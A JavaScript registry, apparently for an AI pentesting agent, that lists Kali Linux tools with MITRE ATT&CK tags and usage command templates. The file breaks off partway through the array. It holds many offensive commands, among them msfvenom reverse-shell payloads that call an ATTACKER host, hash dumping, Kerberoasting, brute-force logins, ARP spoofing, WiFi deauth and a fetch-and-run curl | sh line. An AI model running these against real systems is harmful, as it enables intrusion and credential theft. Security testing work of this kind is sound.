// Jarvis Cyber — Comprehensive Kali Linux Tool Registry
// Dynamic auto-detection + 150+ tools mapped to MITRE ATT&CK techniques
// NOW WITH usage examples so the AI can construct commands dynamically
import { execSync } from 'child_process';

// ═══════════════════════════════════════════════════════════
// KALI LINUX TOOL DATABASE — All major categories with USAGE
// ═══════════════════════════════════════════════════════════
const KALI_TOOLS = [
  // ═══ INFORMATION GATHERING ═══
  { name: 'nmap', bin: 'nmap', cat: 'information-gathering', desc: 'Network exploration and security auditing — port scanning, service/OS detection, NSE scripting', install: 'sudo apt install -y nmap', mitre: ['T1595', 'T1046'],
    usage: [
      'nmap -sV -sC -p- TARGET              # Full port scan + service detect + default scripts',
      'nmap -sS -T4 --top-ports 1000 TARGET  # Fast SYN stealth scan top 1000',
      'nmap -sU --top-ports 50 TARGET        # UDP scan top 50 ports',
      'nmap -sA TARGET                       # ACK scan — detect firewall rules',
      'nmap -sV -p 80,443 --script=http-enum,http-vuln* TARGET  # Web-focused vuln scan',
      'nmap --script vuln TARGET             # Run all vulnerability scripts',
      'nmap -sV --script=banner TARGET       # Service banner grabbing',
      'nmap -O TARGET                        # OS detection',
      'nmap -Pn -f -D RND:10 -g 53 TARGET   # Firewall evasion: fragmentation + decoys + source port',
      'nmap -sF TARGET                       # FIN scan (stealth)',
      'nmap -sN TARGET                       # NULL scan (stealth)',
      'nmap --script=ssl-enum-ciphers,ssl-cert,ssl-heartbleed -p 443 TARGET  # SSL analysis',
    ]},
  { name: 'masscan', bin: 'masscan', cat: 'information-gathering', desc: 'Ultra-fast Internet-scale port scanner — 10M packets/sec', install: 'sudo apt install -y masscan', mitre: ['T1595'],
    usage: [
      'masscan -p1-65535 TARGET --rate=10000     # Full port scan at 10k pps',
      'masscan -p 80,443,8080 TARGET --rate=1000 # Specific ports',
      'masscan -p1-65535 TARGET --rate=100000 -oJ output.json  # JSON output',
      'masscan TARGET/24 -p 22,80,443 --rate=5000  # Subnet scan',
    ]},
  { name: 'amass', bin: 'amass', cat: 'information-gathering', desc: 'In-depth attack surface mapping and asset discovery', install: 'sudo apt install -y amass', mitre: ['T1590', 'T1593'],
    usage: [
      'amass enum -d DOMAIN                  # Passive subdomain enumeration',
      'amass enum -active -d DOMAIN          # Active + passive enumeration',
      'amass enum -brute -d DOMAIN           # Brute-force subdomain discovery',
      'amass intel -d DOMAIN -whois          # WHOIS intelligence gathering',
    ]},
  { name: 'subfinder', bin: 'subfinder', cat: 'information-gathering', desc: 'Passive subdomain enumeration from 30+ sources', install: 'go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest', mitre: ['T1590'],
    usage: [
      'subfinder -d DOMAIN -all              # All sources',
      'subfinder -d DOMAIN -o subs.txt       # Save to file',
      'subfinder -dL domains.txt -json       # Multi-domain JSON output',
    ]},
  { name: 'theharvester', bin: 'theHarvester', cat: 'information-gathering', desc: 'Email, subdomain, IP address harvesting from public sources', install: 'sudo apt install -y theharvester', mitre: ['T1589', 'T1593'],
    usage: [
      'theHarvester -d DOMAIN -b all -l 200  # All sources, 200 results',
      'theHarvester -d DOMAIN -b google,bing,linkedin  # Specific sources',
    ]},
  { name: 'recon-ng', bin: 'recon-ng', cat: 'information-gathering', desc: 'Full-featured web reconnaissance framework', install: 'sudo apt install -y recon-ng', mitre: ['T1593', 'T1596'],
    usage: [
      'recon-ng -w workspace                 # Start with workspace (interactive)',
    ]},
  { name: 'maltego', bin: 'maltego', cat: 'information-gathering', desc: 'Interactive data mining and link analysis for OSINT', install: 'sudo apt install -y maltego', mitre: ['T1591', 'T1593'] },
  { name: 'spiderfoot', bin: 'spiderfoot', cat: 'information-gathering', desc: 'OSINT automation tool for threat intelligence', install: 'sudo apt install -y spiderfoot', mitre: ['T1593', 'T1596'],
    usage: [
      'spiderfoot -s TARGET -t EMAILADDR,INTERNET_NAME -q  # CLI scan for emails+hosts',
      'spiderfoot -l 127.0.0.1:5001          # Start web UI',
    ]},
  { name: 'dmitry', bin: 'dmitry', cat: 'information-gathering', desc: 'Deepmagic information gathering tool', install: 'sudo apt install -y dmitry', mitre: ['T1590'],
    usage: [
      'dmitry -winsepfb DOMAIN               # Full info gathering (whois, netcraft, subdomain, email, port)',
    ]},
  { name: 'fierce', bin: 'fierce', cat: 'information-gathering', desc: 'DNS reconnaissance tool for locating non-contiguous IP space', install: 'sudo apt install -y fierce', mitre: ['T1590'],
    usage: [
      'fierce --domain DOMAIN                # DNS recon + zone transfer attempt',
      'fierce --domain DOMAIN --subdomains subs.txt  # Brute with wordlist',
    ]},
  { name: 'dnsenum', bin: 'dnsenum', cat: 'information-gathering', desc: 'DNS enumeration — zone transfers, brute force, Google scraping', install: 'sudo apt install -y dnsenum', mitre: ['T1590'],
    usage: [
      'dnsenum DOMAIN                        # Full DNS enumeration',
      'dnsenum --enum DOMAIN                 # Enumerate with Google scraping',
    ]},
  { name: 'dnsrecon', bin: 'dnsrecon', cat: 'information-gathering', desc: 'DNS enumeration with zone transfers, cache snooping, brute force', install: 'sudo apt install -y dnsrecon', mitre: ['T1590'],
    usage: [
      'dnsrecon -d DOMAIN -t std,brt,axfr    # Standard + brute + zone transfer',
    ]},
  { name: 'enum4linux', bin: 'enum4linux', cat: 'information-gathering', desc: 'Windows and Samba enumeration tool', install: 'sudo apt install -y enum4linux', mitre: ['T1087', 'T1135'],
    usage: [
      'enum4linux -a TARGET                  # Full enumeration (users, shares, groups, policies)',
      'enum4linux -U TARGET                  # Users only',
      'enum4linux -S TARGET                  # Shares only',
    ]},
  { name: 'nbtscan', bin: 'nbtscan', cat: 'information-gathering', desc: 'NetBIOS name network scanner', install: 'sudo apt install -y nbtscan', mitre: ['T1046'],
    usage: ['nbtscan TARGET/24                    # Scan subnet for NetBIOS names'] },
  { name: 'smbclient', bin: 'smbclient', cat: 'information-gathering', desc: 'FTP-like client for SMB/CIFS shares', install: 'sudo apt install -y smbclient', mitre: ['T1135'],
    usage: [
      'smbclient -L //TARGET -N              # List shares (no password)',
      'smbclient //TARGET/share -U user      # Connect to specific share',
    ]},
  { name: 'smbmap', bin: 'smbmap', cat: 'information-gathering', desc: 'SMB share enumeration with permissions', install: 'sudo apt install -y smbmap', mitre: ['T1135'],
    usage: [
      'smbmap -H TARGET                      # Enumerate shares with permissions',
      'smbmap -H TARGET -u user -p pass      # Authenticated enumeration',
      'smbmap -H TARGET -R                   # Recursive listing',
    ]},
  { name: 'snmpwalk', bin: 'snmpwalk', cat: 'information-gathering', desc: 'SNMP MIB object retrieval', install: 'sudo apt install -y snmp', mitre: ['T1046'],
    usage: ['snmpwalk -c public -v2c TARGET        # Walk SNMP with community string "public"'] },
  { name: 'onesixtyone', bin: 'onesixtyone', cat: 'information-gathering', desc: 'Fast SNMP community string scanner', install: 'sudo apt install -y onesixtyone', mitre: ['T1046'],
    usage: ['onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt TARGET'] },
  { name: 'arp-scan', bin: 'arp-scan', cat: 'information-gathering', desc: 'ARP scanner for local network discovery', install: 'sudo apt install -y arp-scan', mitre: ['T1018'],
    usage: ['sudo arp-scan -l                      # Scan local network'] },
  { name: 'netdiscover', bin: 'netdiscover', cat: 'information-gathering', desc: 'Active/passive ARP network discovery', install: 'sudo apt install -y netdiscover', mitre: ['T1018'],
    usage: ['sudo netdiscover -r TARGET/24          # Active ARP discovery on subnet'] },
  { name: 'whatweb', bin: 'whatweb', cat: 'information-gathering', desc: 'Web technology identification — 1800+ plugins', install: 'sudo apt install -y whatweb', mitre: ['T1592'],
    usage: [
      'whatweb TARGET                         # Quick fingerprint',
      'whatweb -a 3 TARGET                    # Aggressive detection',
      'whatweb --log-json=- TARGET            # JSON output',
    ]},
  { name: 'wafw00f', bin: 'wafw00f', cat: 'information-gathering', desc: 'Web Application Firewall fingerprinting — 150+ WAF signatures', install: 'sudo apt install -y wafw00f', mitre: ['T1590'],
    usage: [
      'wafw00f URL                            # Detect WAF',
      'wafw00f -a URL                         # Test all WAF signatures',
    ]},
  { name: 'lbd', bin: 'lbd', cat: 'information-gathering', desc: 'Load balancer detector', install: 'sudo apt install -y lbd', mitre: ['T1590'],
    usage: ['lbd DOMAIN                            # Detect load balancers'] },
  { name: 'hping3', bin: 'hping3', cat: 'information-gathering', desc: 'TCP/IP packet assembler/analyzer — custom packet crafting', install: 'sudo apt install -y hping3', mitre: ['T1595'],
    usage: [
      'hping3 -S TARGET -p 80                 # SYN probe port 80',
      'hping3 -S TARGET -p 80 --scan 1-1000   # Port scan range',
      'hping3 --traceroute -V -1 TARGET        # ICMP traceroute',
      'hping3 -A TARGET -p 80                  # ACK scan (firewall detection)',
    ]},
  { name: 'unicornscan', bin: 'unicornscan', cat: 'information-gathering', desc: 'Asynchronous stateless TCP/UDP scanner', install: 'sudo apt install -y unicornscan', mitre: ['T1595'],
    usage: ['unicornscan -mT -Iv TARGET:1-65535     # Full TCP scan verbose'] },
  { name: 'p0f', bin: 'p0f', cat: 'information-gathering', desc: 'Passive OS fingerprinting tool', install: 'sudo apt install -y p0f', mitre: ['T1592'] },

  // ═══ VULNERABILITY ANALYSIS ═══
  { name: 'nuclei', bin: 'nuclei', cat: 'vulnerability-analysis', desc: 'Fast template-based vulnerability scanner with 8000+ templates', install: 'go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest', mitre: ['T1190', 'T1595'],
    usage: [
      'nuclei -u URL                          # Scan with all templates',
      'nuclei -u URL -t cves/                 # CVE templates only',
      'nuclei -u URL -t http/vulnerabilities/ # Web vuln templates',
      'nuclei -u URL -severity critical,high  # Critical+high only',
      'nuclei -l urls.txt -o results.txt      # Batch scan from list',
      'nuclei -u URL -tags sqli,xss,rce       # Specific vulnerability types',
    ]},
  { name: 'nikto', bin: 'nikto', cat: 'vulnerability-analysis', desc: 'Web server vulnerability scanner — 6700+ dangerous checks', install: 'sudo apt install -y nikto', mitre: ['T1190'],
    usage: [
      'nikto -h TARGET                        # Full web server scan',
      'nikto -h TARGET -p 8080                # Specific port',
      'nikto -h TARGET -Tuning x              # Reverse tuning (exclude slow tests)',
      'nikto -h TARGET -ssl                   # Force SSL',
    ]},
  { name: 'openvas', bin: 'gvm-cli', cat: 'vulnerability-analysis', desc: 'Open Vulnerability Assessment Scanner', install: 'sudo apt install -y openvas', mitre: ['T1595'] },
  { name: 'lynis', bin: 'lynis', cat: 'vulnerability-analysis', desc: 'Security auditing tool for Unix/Linux systems', install: 'sudo apt install -y lynis', mitre: ['T1082'],
    usage: ['lynis audit system                     # Full system security audit'] },

  // ═══ WEB APPLICATION ANALYSIS ═══
  { name: 'burpsuite', bin: 'burpsuite', cat: 'web-application', desc: 'Web application security testing platform — proxy, scanner, repeater, intruder. Routes HTTP traffic for interception and analysis. Install the MCP Server BApp extension for AI integration.', install: 'sudo apt install -y burpsuite', mitre: ['T1190'], proxy_port: 8080,
    usage: [
      'burpsuite &                                               # Launch Burp Suite GUI in background',
      'curl -x http://127.0.0.1:8080 -sk "https://target/"      # Route GET request through Burp proxy',
      'curl -x http://127.0.0.1:8080 -sk -X POST -d "user=admin&pass=test" "https://target/login"  # POST through Burp',
      'curl -x http://127.0.0.1:8080 -sk -H "X-Custom: payload" "https://target/api"  # Custom headers through Burp',
      'curl -x http://127.0.0.1:8080 -sk -b "session=abc123" "https://target/admin"   # Cookies through Burp proxy',
    ]},
  { name: 'zaproxy', bin: 'zaproxy', cat: 'web-application', desc: 'OWASP ZAP — web application security scanner and proxy', install: 'sudo apt install -y zaproxy', mitre: ['T1190'], proxy_port: 8090,
    usage: [
      'zaproxy -daemon -port 8090 -config api.disablekey=true  # Start daemon mode',
      'zaproxy -cmd -quickurl URL -quickout report.html        # Quick scan + report',
      'curl "http://127.0.0.1:8090/JSON/spider/action/scan/?url=URL"  # API: start spider',
      'curl "http://127.0.0.1:8090/JSON/ascan/action/scan/?url=URL"   # API: start active scan',
      'curl "http://127.0.0.1:8090/JSON/core/view/alerts/"            # API: get results',
    ]},
  { name: 'sqlmap', bin: 'sqlmap', cat: 'web-application', desc: 'Automatic SQL injection and database takeover', install: 'sudo apt install -y sqlmap', mitre: ['T1190'],
    usage: [
      'sqlmap -u "URL?param=value" --batch --dbs           # Auto detect + list databases',
      'sqlmap -u "URL?param=value" --batch -D dbname --tables  # List tables',
      'sqlmap -u "URL?param=value" --batch -D db -T table --dump  # Dump table',
      'sqlmap -u "URL" --forms --batch --crawl=2           # Crawl and test all forms',
      'sqlmap -r request.txt --batch                       # From Burp/ZAP saved request',
      'sqlmap -u "URL?param=value" --os-shell               # Get OS shell via SQLi',
      'sqlmap -u "URL" --batch --tamper=space2comment,between  # WAF bypass tampers',
    ]},
  { name: 'wpscan', bin: 'wpscan', cat: 'web-application', desc: 'WordPress security scanner', install: 'sudo apt install -y wpscan', mitre: ['T1190'],
    usage: [
      'wpscan --url URL                       # Basic WordPress scan',
      'wpscan --url URL --enumerate ap,at,u   # Enumerate all plugins, themes, users',
      'wpscan --url URL -U users.txt -P pass.txt  # Brute-force login',
      'wpscan --url URL --api-token TOKEN     # With WPScan API for vuln data',
    ]},
  { name: 'joomscan', bin: 'joomscan', cat: 'web-application', desc: 'Joomla vulnerability scanner', install: 'sudo apt install -y joomscan', mitre: ['T1190'],
    usage: ['joomscan -u URL                        # Full Joomla scan'] },
  { name: 'gobuster', bin: 'gobuster', cat: 'web-application', desc: 'Directory/file/DNS/vhost brute-forcing tool', install: 'sudo apt install -y gobuster', mitre: ['T1595'],
    usage: [
      'gobuster dir -u URL -w /usr/share/wordlists/dirb/common.txt       # Directory brute',
      'gobuster dir -u URL -w WORDLIST -x php,html,txt,bak               # With extensions',
      'gobuster dns -d DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt  # DNS brute',
      'gobuster vhost -u URL -w WORDLIST                                  # Virtual host brute',
    ]},
  { name: 'dirb', bin: 'dirb', cat: 'web-application', desc: 'Web content scanner — dictionary-based directory brute force', install: 'sudo apt install -y dirb', mitre: ['T1595'],
    usage: ['dirb URL /usr/share/wordlists/dirb/common.txt  # Directory scan'] },
  { name: 'ffuf', bin: 'ffuf', cat: 'web-application', desc: 'Fast web fuzzer — content/parameter/vhost discovery', install: 'go install github.com/ffuf/ffuf/v2@latest', mitre: ['T1595'],
    usage: [
      'ffuf -u URL/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403  # Dir discovery',
      'ffuf -u URL/FUZZ -w WORDLIST -e .php,.html,.txt,.bak    # With extensions',
      'ffuf -u URL?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt  # Param fuzzing',
      'ffuf -u URL -H "Host: FUZZ.domain.com" -w WORDLIST      # VHost discovery',
      'ffuf -u URL/FUZZ -w WORDLIST -fc 404 -fs SIZE           # Filter by size + status',
    ]},
  { name: 'feroxbuster', bin: 'feroxbuster', cat: 'web-application', desc: 'Recursive content discovery tool', install: 'sudo apt install -y feroxbuster', mitre: ['T1595'],
    usage: [
      'feroxbuster -u URL -w WORDLIST         # Recursive dir scan',
      'feroxbuster -u URL -x php,html,txt     # With extensions',
    ]},
  { name: 'wfuzz', bin: 'wfuzz', cat: 'web-application', desc: 'Web application fuzzer — flexible payloads and encoders', install: 'sudo apt install -y wfuzz', mitre: ['T1190'],
    usage: [
      'wfuzz -w WORDLIST --hc 404 URL/FUZZ    # Dir brute hiding 404s',
      'wfuzz -z range,1-100 --hc 404 "URL?id=FUZZ"  # Parameter fuzzing with range',
    ]},
  { name: 'commix', bin: 'commix', cat: 'web-application', desc: 'Automated command injection exploitation', install: 'sudo apt install -y commix', mitre: ['T1190'],
    usage: [
      'commix -u "URL?param=value" --batch    # Auto command injection test',
      'commix -u "URL" --data="param=value" --batch  # POST data injection',
    ]},
  { name: 'xsstrike', bin: 'xsstrike', cat: 'web-application', desc: 'Advanced XSS detection and exploitation', install: 'git clone https://github.com/s0md3v/XSStrike.git', mitre: ['T1190'],
    usage: ['python3 xsstrike.py -u "URL?param=value"  # XSS detection'] },
  { name: 'dalfox', bin: 'dalfox', cat: 'web-application', desc: 'Parameter analysis and XSS scanner', install: 'go install github.com/hahwul/dalfox/v2@latest', mitre: ['T1190'],
    usage: [
      'dalfox url "URL?param=value"           # XSS scan single URL',
      'dalfox file urls.txt                   # Batch XSS scan',
    ]},
  { name: 'httpx', bin: 'httpx', cat: 'web-application', desc: 'Multi-purpose HTTP toolkit for probing and tech detection', install: 'go install github.com/projectdiscovery/httpx/cmd/httpx@latest', mitre: ['T1592'],
    usage: [
      'echo DOMAIN | httpx -status-code -title -tech-detect -server  # Probe with details',
      'cat subdomains.txt | httpx -json       # Batch probe + JSON output',
    ]},
  { name: 'katana', bin: 'katana', cat: 'web-application', desc: 'Next-gen web crawling and spidering framework', install: 'go install github.com/projectdiscovery/katana/cmd/katana@latest', mitre: ['T1595'],
    usage: [
      'katana -u URL -d 3                     # Crawl 3 levels deep',
      'katana -u URL -jc -aff                 # JavaScript crawling + auto form fill',
    ]},
  { name: 'arjun', bin: 'arjun', cat: 'web-application', desc: 'HTTP parameter discovery suite', install: 'pip3 install arjun', mitre: ['T1190'],
    usage: ['arjun -u URL                          # Discover hidden parameters'] },
  { name: 'sslscan', bin: 'sslscan', cat: 'web-application', desc: 'SSL/TLS cipher and vulnerability scanner', install: 'sudo apt install -y sslscan', mitre: ['T1590'],
    usage: [
      'sslscan TARGET                         # Full SSL/TLS scan',
      'sslscan --no-colour TARGET:443         # Scripted output',
    ]},
  { name: 'testssl', bin: 'testssl', cat: 'web-application', desc: 'Comprehensive TLS/SSL testing on any port', install: 'sudo apt install -y testssl.sh', mitre: ['T1590'],
    usage: ['testssl.sh --quiet TARGET:443         # Full TLS analysis'] },
  { name: 'sslyze', bin: 'sslyze', cat: 'web-application', desc: 'Python SSL/TLS scanner — ROBOT, heartbleed, CCS', install: 'pip3 install sslyze', mitre: ['T1590'],
    usage: ['sslyze --regular TARGET:443            # Standard SSL analysis'] },

  // ═══ PASSWORD ATTACKS ═══
  { name: 'hydra', bin: 'hydra', cat: 'password-attacks', desc: 'Fast network logon cracker — 50+ protocols', install: 'sudo apt install -y hydra', mitre: ['T1110'],
    usage: [
      'hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET ssh      # SSH brute',
      'hydra -L users.txt -P pass.txt TARGET ftp                          # FTP brute',
      'hydra -l admin -P pass.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:F=failed"  # Web login brute',
      'hydra -l admin -P pass.txt TARGET mysql                            # MySQL brute',
      'hydra -l admin -P pass.txt rdp://TARGET                            # RDP brute',
    ]},
  { name: 'john', bin: 'john', cat: 'password-attacks', desc: 'John the Ripper password cracker', install: 'sudo apt install -y john', mitre: ['T1110'],
    usage: [
      'john --wordlist=/usr/share/wordlists/rockyou.txt HASHFILE           # Dictionary attack',
      'john --format=raw-md5 HASHFILE                                      # Specific hash format',
      'john --show HASHFILE                                                # Show cracked passwords',
      'john --rules=best64 --wordlist=WORDLIST HASHFILE                    # With mutation rules',
    ]},
  { name: 'hashcat', bin: 'hashcat', cat: 'password-attacks', desc: 'GPU-accelerated hash cracking — 300+ hash types', install: 'sudo apt install -y hashcat', mitre: ['T1110'],
    usage: [
      'hashcat -m 0 HASHFILE /usr/share/wordlists/rockyou.txt --force      # MD5 dictionary',
      'hashcat -m 1000 HASHFILE WORDLIST --force                           # NTLM',
      'hashcat -m 1800 HASHFILE WORDLIST --force                           # SHA-512 Unix',
      'hashcat -m 22000 capture.hc22000 WORDLIST --force                   # WPA2',
      'hashcat -m 0 -a 3 HASHFILE ?d?d?d?d?d?d --force                    # Mask: 6 digits',
      'hashcat -m 0 HASHFILE WORDLIST -r /usr/share/hashcat/rules/best64.rule --force  # Rules',
    ]},
  { name: 'medusa', bin: 'medusa', cat: 'password-attacks', desc: 'Parallel network login auditor', install: 'sudo apt install -y medusa', mitre: ['T1110'],
    usage: ['medusa -h TARGET -u admin -P pass.txt -M ssh                   # SSH brute'] },
  { name: 'ncrack', bin: 'ncrack', cat: 'password-attacks', desc: 'High-speed network authentication cracking', install: 'sudo apt install -y ncrack', mitre: ['T1110'],
    usage: ['ncrack -p ssh:22 -U users.txt -P pass.txt TARGET               # SSH brute'] },
  { name: 'ophcrack', bin: 'ophcrack', cat: 'password-attacks', desc: 'Windows password cracker using rainbow tables', install: 'sudo apt install -y ophcrack', mitre: ['T1110'] },
  { name: 'cewl', bin: 'cewl', cat: 'password-attacks', desc: 'Custom wordlist generator from web pages', install: 'sudo apt install -y cewl', mitre: ['T1110'],
    usage: ['cewl URL -d 2 -m 5 -w wordlist.txt     # Generate wordlist from website'] },
  { name: 'crunch', bin: 'crunch', cat: 'password-attacks', desc: 'Charset-based wordlist generator', install: 'sudo apt install -y crunch', mitre: ['T1110'],
    usage: ['crunch 6 8 0123456789 -o nums.txt       # Generate 6-8 digit number wordlist'] },
  { name: 'patator', bin: 'patator', cat: 'password-attacks', desc: 'Multi-purpose brute-forcer with modular design', install: 'sudo apt install -y patator', mitre: ['T1110'],
    usage: ['patator ssh_login host=TARGET user=admin password=FILE0 0=pass.txt  # SSH brute'] },

  // ═══ WIRELESS ATTACKS ═══
  { name: 'aircrack-ng', bin: 'aircrack-ng', cat: 'wireless-attacks', desc: 'WiFi security audit suite — monitor, inject, crack WPA/WPA2', install: 'sudo apt install -y aircrack-ng', mitre: ['T1595'],
    usage: [
      'airmon-ng start wlan0                  # Enable monitor mode',
      'airodump-ng wlan0mon                   # Scan for APs',
      'airodump-ng -c CHANNEL --bssid BSSID -w capture wlan0mon  # Capture handshake',
      'aireplay-ng -0 2 -a BSSID wlan0mon    # Deauth (2 packets)',
      'aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap  # Crack WPA',
    ]},
  { name: 'wifite', bin: 'wifite', cat: 'wireless-attacks', desc: 'Automated WiFi auditing tool', install: 'sudo apt install -y wifite', mitre: ['T1595'],
    usage: ['wifite --kill                          # Auto WiFi attack (kills interfering processes)'] },
  { name: 'bettercap', bin: 'bettercap', cat: 'wireless-attacks', desc: 'Network MITM framework for WiFi, BLE, HID', install: 'sudo apt install -y bettercap', mitre: ['T1557'],
    usage: [
      'sudo bettercap -iface IFACE -eval "net.probe on; net.sniff on"     # Network sniffing',
      'sudo bettercap -iface IFACE -eval "set arp.spoof.targets TARGET; arp.spoof on; net.sniff on"  # ARP MITM',
      'sudo bettercap -iface wlan0 -eval "wifi.recon on"                  # WiFi recon',
    ]},
  { name: 'reaver', bin: 'reaver', cat: 'wireless-attacks', desc: 'WPS PIN brute force attack', install: 'sudo apt install -y reaver', mitre: ['T1110'],
    usage: ['reaver -i wlan0mon -b BSSID -vv         # WPS PIN brute force'] },
  { name: 'kismet', bin: 'kismet', cat: 'wireless-attacks', desc: 'Wireless network detector, sniffer, and IDS', install: 'sudo apt install -y kismet', mitre: ['T1040'] },
  { name: 'hcxdumptool', bin: 'hcxdumptool', cat: 'wireless-attacks', desc: 'Capture PMKID and handshakes from WiFi', install: 'sudo apt install -y hcxdumptool', mitre: ['T1040'],
    usage: ['hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1  # Capture PMKID'] },
  { name: 'hcxtools', bin: 'hcxpcapngtool', cat: 'wireless-attacks', desc: 'Convert WiFi captures to hashcat format', install: 'sudo apt install -y hcxtools', mitre: ['T1110'],
    usage: ['hcxpcapngtool -o hash.hc22000 capture.pcapng  # Convert to hashcat format'] },
  { name: 'mdk4', bin: 'mdk4', cat: 'wireless-attacks', desc: 'WiFi exploitation toolkit', install: 'sudo apt install -y mdk4', mitre: ['T1498'] },

  // ═══ EXPLOITATION TOOLS ═══
  { name: 'metasploit', bin: 'msfconsole', cat: 'exploitation', desc: 'World\'s most used penetration testing framework', install: 'sudo apt install -y metasploit-framework', mitre: ['T1190', 'T1203'],
    usage: [
      'msfconsole -q -x "search vsftpd; use 0; set RHOSTS TARGET; run"    # Quick exploit',
      'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ATTACKER; set LPORT 4444; run"  # Handler',
    ]},
  { name: 'msfvenom', bin: 'msfvenom', cat: 'exploitation', desc: 'Metasploit payload generator and encoder', install: 'sudo apt install -y metasploit-framework', mitre: ['T1587'],
    usage: [
      'msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f elf -o shell.elf  # Linux reverse shell',
      'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o shell.exe  # Windows meterpreter',
      'msfvenom -p php/reverse_php LHOST=ATTACKER LPORT=4444 -o shell.php   # PHP reverse shell',
      'msfvenom -p cmd/unix/reverse_bash LHOST=ATTACKER LPORT=4444 -f raw    # Bash one-liner',
      'msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o encoded.exe  # Encoded payload',
    ]},
  { name: 'searchsploit', bin: 'searchsploit', cat: 'exploitation', desc: 'Offline exploit-db search — 45000+ exploits', install: 'sudo apt install -y exploitdb', mitre: ['T1588'],
    usage: [
      'searchsploit SERVICE VERSION           # Search exploits',
      'searchsploit -j SERVICE VERSION        # JSON output',
      'searchsploit -m EXPLOIT_ID             # Copy exploit to current dir',
      'searchsploit -x EXPLOIT_PATH           # View exploit code',
    ]},
  { name: 'crackmapexec', bin: 'crackmapexec', cat: 'exploitation', desc: 'Swiss army knife for AD/Windows pentesting', install: 'sudo apt install -y crackmapexec', mitre: ['T1021'],
    usage: [
      'crackmapexec smb TARGET --shares       # List SMB shares',
      'crackmapexec smb TARGET -u user -p pass --sam  # Dump SAM hashes',
      'crackmapexec smb TARGET/24 -u user -p pass    # Spray across subnet',
      'crackmapexec winrm TARGET -u user -p pass -x "whoami"  # Remote command exec',
    ]},
  { name: 'evil-winrm', bin: 'evil-winrm', cat: 'exploitation', desc: 'WinRM shell for pentesting', install: 'gem install evil-winrm', mitre: ['T1021'],
    usage: ['evil-winrm -i TARGET -u user -p pass   # Get WinRM shell'] },
  { name: 'impacket', bin: 'impacket-psexec', cat: 'exploitation', desc: 'Python classes for network protocols — AD attacks', install: 'pip3 install impacket', mitre: ['T1021', 'T1003'],
    usage: [
      'impacket-psexec user:pass@TARGET        # PsExec shell',
      'impacket-smbexec user:pass@TARGET       # SMBExec shell',
      'impacket-wmiexec user:pass@TARGET       # WMI shell',
      'impacket-secretsdump user:pass@TARGET   # Dump all hashes',
      'impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip DC_IP  # AS-REP roasting',
      'impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP -request   # Kerberoasting',
    ]},

  // ═══ SNIFFING & SPOOFING ═══
  { name: 'wireshark', bin: 'wireshark', cat: 'sniffing-spoofing', desc: 'Network protocol analyzer with GUI', install: 'sudo apt install -y wireshark', mitre: ['T1040'] },
  { name: 'tshark', bin: 'tshark', cat: 'sniffing-spoofing', desc: 'CLI network protocol analyzer', install: 'sudo apt install -y tshark', mitre: ['T1040'],
    usage: [
      'tshark -i IFACE -c 100                 # Capture 100 packets',
      'tshark -i IFACE -f "port 80" -Y "http" # Filter HTTP traffic',
      'tshark -r capture.pcap -T fields -e ip.src -e ip.dst -e tcp.dstport  # Extract fields from pcap',
    ]},
  { name: 'tcpdump', bin: 'tcpdump', cat: 'sniffing-spoofing', desc: 'CLI packet capture and analysis', install: 'sudo apt install -y tcpdump', mitre: ['T1040'],
    usage: [
      'tcpdump -i IFACE -c 100 -nn           # Capture 100 packets no DNS resolve',
      'tcpdump -i IFACE port 80 -A           # Capture HTTP traffic in ASCII',
      'tcpdump -i IFACE -w capture.pcap      # Save to pcap file',
    ]},
  { name: 'responder', bin: 'responder', cat: 'sniffing-spoofing', desc: 'LLMNR/NBT-NS/mDNS poisoner for credential harvesting', install: 'sudo apt install -y responder', mitre: ['T1557'],
    usage: ['sudo responder -I IFACE -dwPv          # Start poisoner on interface'] },
  { name: 'ettercap', bin: 'ettercap', cat: 'sniffing-spoofing', desc: 'Comprehensive MITM attack suite', install: 'sudo apt install -y ettercap-text-only', mitre: ['T1557'],
    usage: ['ettercap -T -i IFACE -M arp:remote /TARGET// /GATEWAY//  # ARP MITM'] },
  { name: 'macchanger', bin: 'macchanger', cat: 'sniffing-spoofing', desc: 'MAC address changer', install: 'sudo apt install -y macchanger', mitre: ['T1036'],
    usage: ['macchanger -r IFACE                    # Random MAC address'] },
  { name: 'mitmproxy', bin: 'mitmproxy', cat: 'sniffing-spoofing', desc: 'Interactive HTTPS proxy for analysis', install: 'sudo apt install -y mitmproxy', mitre: ['T1557'] },

  // ═══ POST-EXPLOITATION ═══
  { name: 'bloodhound', bin: 'bloodhound', cat: 'post-exploitation', desc: 'Active Directory attack path visualization', install: 'sudo apt install -y bloodhound', mitre: ['T1087', 'T1482'],
    usage: ['bloodhound-python -d DOMAIN -u user -p pass -c All -ns DC_IP  # Collect AD data'] },
  { name: 'linpeas', bin: 'linpeas.sh', cat: 'post-exploitation', desc: 'Linux privilege escalation audit script', install: 'curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /opt/linpeas.sh && chmod +x /opt/linpeas.sh', mitre: ['T1068'],
    usage: [
      'curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh  # Run directly',
      '/opt/linpeas.sh -a                     # Run all checks',
    ]},
  { name: 'winpeas', bin: 'winPEASx64.exe', cat: 'post-exploitation', desc: 'Windows privilege escalation audit', install: 'curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -o /opt/winpeas.exe', mitre: ['T1068'] },
